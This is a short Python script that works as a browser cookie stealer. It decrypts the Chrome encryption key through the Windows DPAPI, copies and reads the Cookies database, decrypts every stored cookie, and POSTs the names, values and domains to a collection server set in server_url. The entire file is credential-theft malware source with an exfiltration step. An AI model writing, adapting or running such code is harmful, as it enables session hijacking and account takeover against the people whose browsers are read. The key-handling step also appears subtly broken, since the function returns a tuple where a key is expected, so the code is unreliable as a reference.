from Crypto.Cipher import AES
import win32crypt, requests, sqlite3, base64, json, os, shutil

server_url = "http://127.0.0.1:9001"

chrome_PATH = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
localState_PATH = os.path.join(chrome_PATH, 'Local State')
cookies_PATH = os.path.join(chrome_PATH, 'Default', 'Network', 'Cookies')
tempCoock_PATH = os.path.join(os.environ['TEMP'], 'tempcookies.db')

def getEncKey():
    try:
        with open(localState_PATH, 'r', encoding='utf-8') as f:
            localState_DATA = json.load(f)
            encrypted_KEY = localState_DATA['os_crypt']['encrypted_key']
            key_DATA = base64.b64decode(encrypted_KEY)[5:]
            return win32crypt.CryptUnprotectData(key_DATA, None, None, None, 0)
    except Exception as e:
        print(f"[DEBUG] Error while getting encryption key: {e}")
        return None
    
def decryptCookie(enc_val, key):
    try:
        nonce = enc_val[3:15]
        cipher = AES.new(key, AES.MODE_GCM, nonce)
        decrypted_VAL = cipher.decrypt_and_verify(enc_val[15:-16], enc_val[-16:])
        return decrypted_VAL.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"[DEBUG] Decryption error: {e}")
        return None
    
def getCookies():
    key = getEncKey()
    if not key:
        print("Unknown error while retrieving enc key.")
        return []
    
    shutil.copy2(cookies_PATH, tempCoock_PATH)

    cookies = []
    conn = None
    try:
        conn = sqlite3.connect(tempCoock_PATH)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")

        for host_key, name, value, encrypted_value in cursor.fetchall():
            if not value:
                value = decryptCookie(encrypted_value, key)
            if value:
                cookies.append({
                    "name": name,
                    "value": value,
                    "domain": host_key
                })
    except sqlite3.OperationalError as e:
        print(f"SQLite err: {e}")
    finally:
        if conn is not None:
            conn.close()
            os.remove(tempCoock_PATH)
    
    return cookies

def main():
    requests.post(server_url, json=getCookies())

if __name__ == "__main__":
    main()